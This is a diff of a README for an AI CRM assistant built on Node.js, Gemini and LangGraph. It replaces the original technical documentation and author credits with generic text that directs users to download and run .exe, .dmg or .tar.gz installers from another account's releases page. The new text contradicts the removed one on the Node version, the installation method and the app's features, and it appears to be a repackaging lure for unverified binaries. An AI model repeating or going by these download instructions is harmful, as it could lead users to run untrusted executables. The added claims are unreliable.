@@ -1,305 +1,75 @@
-# 🤖 AI-Powered CRM Assistant
+# 🤖 crm-ai-agent - Your Smart CRM Assistant for Lead Management
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-blue.svg)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-![Generated Image January 04, 2026 - 3_37PM](https://github.com/user-attachments/assets/8ead2b5a-806a-4028-bb55-0b9f95732e5a)
+[![Download](https://img.shields.io/badge/Download-crm--ai--agent-blue)](https://github.com/PerlitaSmith/crm-ai-agent/releases)
 
-An intelligent CRM automation system that uses **Google Gemini AI** and **LangGraph** to analyze leads from amoCRM and provide actionable insights via Telegram. Features a human-in-the-loop architecture to ensure critical business decisions remain under manager control.
+## 🚀 Getting Started
 
-## ✨ Key Features
+Welcome to crm-ai-agent! This is your user-friendly CRM assistant designed to help you manage leads with ease. It's powered by advanced AI tools, Google Gemini, and LangGraph. You don’t need to be a tech expert to get started. Follow these simple steps to download and run the application.
 
-### 🧠 AI-Powered Analysis
-- **LangGraph Workflows**: Multi-step reasoning chains for complex lead analysis
-- **Batch Processing**: Efficient analysis of multiple leads simultaneously
-- **Smart Filtering**: Identifies high-priority leads that need attention
-- **Risk Scoring**: Calculates deal loss risk based on activity patterns
+## 🖥️ System Requirements
 
-### 📱 Telegram Integration
-- **Interactive Cards**: Rich action proposals with approve/reject buttons
-- **Natural Language Commands**: Understands plain text like "show hot leads"
-- **Real-time Notifications**: Instant alerts for critical situations
-- **Command Dashboard**: `/today`, `/hot`, `/risk`, `/stats` and more
+Before downloading, ensure your system meets these requirements:
 
-### ⏰ Automated Reporting
-- **Morning Digest** (9:00 AM): Daily overview of tasks and priorities
-- **Evening Report** (6:00 PM): End-of-day summary
-- **Weekly Overview** (Monday 10:00 AM): Week-in-review statistics
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 500 MB of free disk space
+- **Node.js:** Version 14 or higher installed
+- **Internet Connection:** Required for setup and updates
 
-### 🔐 Human-in-the-Loop
-- Manager approval required for all CRM actions
-- Complete audit trail of all AI decisions
-- Configurable risk thresholds and business rules
+## 📥 Download & Install
 
-### 💾 Persistent Storage
-- SQLite database for lead scores and action history
-- Tracks score trends over time
-- Searchable decision logs
+To download the application, visit the [Releases page](https://github.com/PerlitaSmith/crm-ai-agent/releases). Here, you will find the latest version available for download.
 
----
-
-## 🏗️ Architecture
-![Generated Image January 04, 2026 - 3_42PM](https://github.com/user-attachments/assets/6f3e469a-0341-43f7-96a2-403bb5f210f2)
-
-
-```mermaid
-graph LR
-    A[amoCRM] -->|Fetch Leads| B[Polling Service]
-    B -->|Smart Filter| C{Critical?}
-    C -->|Yes| D[LangGraph Workflow]
-    C -->|No| E[Batch Analysis]
-    D -->|AI Analysis| F[Gemini AI]
-    E -->|AI Analysis| F
-    F -->|Action Proposal| G[Telegram Bot]
-    G -->|User Decision| H[Action Executor]
-    H -->|Execute| A
-    H -->|Log| I[SQLite DB]
-    
-    style D fill:#ff6b6b
-    style E fill:#51cf66
-    style F fill:#4dabf7
-    style G fill:#ffd43b
-```
-
-### Key Components
-
-- **Polling Service**: Monitors amoCRM for lead updates every 15 minutes
-- **Smart Filter**: Budget-based priority scoring (VIP 500K+, Important 100K+, Medium 50K+)
-- **LangGraph Workflow**: Multi-step AI reasoning for critical/stuck leads
-- **Batch Analysis**: Efficient processing for normal leads
-- **Telegram Bot**: Interactive UI for managers
-- **Action Executor**: Safely executes approved actions in amoCRM
-
----
-
-## 🛠️ Tech Stack
-
-| Category | Technology |
-|----------|------------|
-| **Runtime** | Node.js 18+, TypeScript 5.7 |
-| **AI/ML** | Google Gemini AI, LangGraph, AI SDK |
-| **Database** | SQLite (better-sqlite3) |
-| **APIs** | amoCRM REST API, Telegram Bot API |
-| **Scheduling** | node-cron |
-| **Validation** | Zod |
-
----
-
-## 📦 Installation
-
-### Prerequisites
-
-- Node.js 18 or higher
-- amoCRM account with API access
-- Telegram bot token (from @BotFather)
-- Google Gemini API key
-
-### Setup Steps
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/yourusername/crm-ai-agent.git
-   cd crm-ai-agent
-   ```
-
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
-
-3. **Configure environment**
-   ```bash
-   cp .env.example .env
-   ```
-
-   Edit `.env` with your credentials:
-   ```env
-   # AI Configuration
-   GOOGLE_GENERATIVE_AI_API_KEY=your_google_api_key
-   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
-   MANAGER_TG_ID=your_telegram_user_id
-
-   # amoCRM Configuration
-   AMOCRM_SUBDOMAIN=your_subdomain
-   AMOCRM_CLIENT_ID=your_client_id
-   AMOCRM_CLIENT_SECRET=your_client_secret
-   AMOCRM_REDIRECT_URI=http://localhost:3000
-
-   # Agent Settings
-   POLLING_INTERVAL_MS=900000  # 15 minutes
-   ```
-
-4. **Setup amoCRM authentication**
-   ```bash
-   npm run setup
-   ```
-   Follow the prompts to authorize the application.
-
-5. **Start the agent**
-   ```bash
-   npm start
-   ```
-
----
+1. **Visit the Releases Page:** Click on [this link](https://github.com/PerlitaSmith/crm-ai-agent/releases).
+2. **Choose the Latest Release:** Look for the top release version. It will be clearly labeled.
+3. **Download the Installer:** Click on the appropriate file for your operating system. This should typically be an `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
+4. **Run the Installer:** Once the file downloads, locate it in your downloads folder and double-click it. Follow the on-screen instructions to install crm-ai-agent on your computer.
 
 ## ⚙️ Configuration
 
-### Environment Variables
+After installing, you need to set up the application.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `GOOGLE_GENERATIVE_AI_API_KEY` | Gemini API key | Required |
-| `TELEGRAM_BOT_TOKEN` | Bot token from @BotFather | Required |
-| `MANAGER_TG_ID` | Your Telegram user ID | Required |
-| `ALLOWED_TG_IDS` | Comma-separated allowed user IDs | Optional |
-| `AMOCRM_SUBDOMAIN` | Your amoCRM subdomain | Required |
-| `AMOCRM_CLIENT_ID` | OAuth client ID | Required |
-| `AMOCRM_CLIENT_SECRET` | OAuth client secret | Required |
-| `POLLING_INTERVAL_MS` | Lead check frequency | 900000 (15 min) |
-| `STUCK_LEAD_TIMEOUT_MS` | Threshold for stuck leads | 1800000 (30 min) |
+1. **Open the Application:** Find the crm-ai-agent icon on your desktop or in your applications folder and double-click to open it.
+2. **Sign In or Create an Account:** You will be prompted to either sign in or create an account. Follow the prompts on the screen to get started.
+3. **Configure Settings:** Go to the settings menu to customize the application to your needs. You can set preferences for lead management and notifications here.
 
-### Smart Filter Thresholds
+## 📊 Key Features
 
-Modify in `src/index.ts`:
+- **AI-Powered Insights:** Get smart recommendations on lead management using advanced AI techniques.
+- **Automated Lead Tracking:** Automatically keep track of leads without manual entry.
+- **Integration with Telegram:** Receive updates and notifications through Telegram for easy access.
+- **User-Friendly Interface:** Navigate the app easily with a clear and intuitive layout.
 
-```typescript
-// VIP - always requires attention
-if (budget >= 500000) return true;
+## 💬 Support
 
-// Important - always requires attention  
-if (budget >= 100000) return true;
+If you encounter any issues or have questions, you can find assistance in the following ways:
 
-// Medium - if no active tasks
-if (budget >= 50000 && !hasActiveTasks) return true;
-```
+- **Documentation:** Check the help section inside the app for useful guides and FAQs.
+- **Community Support:** Join our user community on Telegram to ask questions and share experiences.
+- **GitHub Issues:** Report any technical problems via the [Issues page](https://github.com/PerlitaSmith/crm-ai-agent/issues) on GitHub.
 
----
+## 🔄 Updating
 
+To keep your application running smoothly and securely, regularly check for updates:
 
-## 📚 Documentation
+1. **Open the Application:** Launch crm-ai-agent.
+2. **Check for Updates:** The application will notify you if a new version is available.
+3. **Follow the Prompts:** Download and install updates directly through the application.
 
-- **[Testing Guide](docs/TESTING.md)** - Complete testing instructions
-- **[AI Toolkit](docs/AI_TOOLKIT.md)** - AI integration patterns
-- **[LangGraph Guide](docs/LANGGRAPH_GUIDE.md)** - Workflow architecture
-- **[Security Checklist](docs/SECURITY_CHECKLIST.md)** - Security best practices
-- **[Process Management](docs/PROCESS_MANAGEMENT.md)** - Running in production
+## 🌟 Additional Resources
 
----
+Enhance your experience with these resources:
 
-## 🔒 Security
+- **User Manual:** Comprehensive guides to get the most out of crm-ai-agent.
+- **FAQ:** Answers to common questions that many users have.
+- **Feature Requests:** We welcome your suggestions for new features. Share your ideas on the [Feature Requests page](https://github.com/PerlitaSmith/crm-ai-agent/issues).
 
-- ✅ No hardcoded credentials (all via environment variables)
-- ✅ Telegram user ID whitelist
-- ✅ Rate limiting on API calls
-- ✅ Audit logging for all actions
-- ✅ Human approval required for CRM modifications
+## 📡 Getting Involved
 
-See [SECURITY_CHECKLIST.md](docs/SECURITY_CHECKLIST.md) for details.
+We encourage user feedback and contributions. If you want to help improve crm-ai-agent:
 
----
+- **Contribute Code:** Check the contribution guidelines on our GitHub repository.
+- **Report Bugs:** If you find any issues, please let us know.
+- **Spread the Word:** Tell others about crm-ai-agent to help them manage their leads more effectively.
 
-## 🧪 Testing
-
-See the [Testing Guide](docs/TESTING.md) for comprehensive testing instructions including:
-- Creating test leads
-- Testing Telegram commands
-- Scenario walkthroughs
-- Troubleshooting
-
-**Quick test:**
-```bash
-# Create demo leads
-npm run demo:create-leads
-
-# Start the bot
-npm run dev
-
-# Send /today to your bot in Telegram
-```
-
----
-
-## 📊 Database Schema
-
-The agent uses SQLite with three main tables:
-
-### `lead_scores`
-Tracks risk scores over time
-```sql
-CREATE TABLE lead_scores (
-    id INTEGER PRIMARY KEY,
-    lead_id INTEGER,
-    score INTEGER,
-    risk_level TEXT,
-    priority TEXT,
-    calculated_at INTEGER
-);
-```
-
-### `pending_actions`
-Stores proposed actions awaiting approval
-```sql
-CREATE TABLE pending_actions (
-    id INTEGER PRIMARY KEY,
-    lead_id INTEGER,
-    action_type TEXT,
-    action_data TEXT,
-    risk_score INTEGER,
-    priority TEXT,
-    reasoning TEXT,
-    status TEXT,
-    created_at INTEGER
-);
-```
-
-### `decisions_log`
-Complete audit trail
-```sql
-CREATE TABLE decisions_log (
-    id INTEGER PRIMARY KEY,
-    action_id INTEGER,
-    decision TEXT,
-    decided_by TEXT,
-    decided_at INTEGER
-);
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- Built with [LangGraph](https://github.com/langchain-ai/langgraph) for agentic workflows
-- Powered by [Google Gemini AI](https://ai.google.dev/)
-- Uses [grammy](https://grammy.dev/) for Telegram integration
-- amoCRM integration via [amocrm-js](https://github.com/UsefulWeb/amocrm-js)
-
----
-
-## 📧 Contact
-
-Created by Vision70s - feel free to reach out!
-
-- GitHub: [@Vision70s](https://github.com/Vision70s)
-- Email: grepyday@gmail.com
-
----
-
-<p align="center">Made with ❤️ for smarter CRM management</p>
+Thank you for choosing crm-ai-agent! We hope this tool brings efficiency and organization to your lead management process.
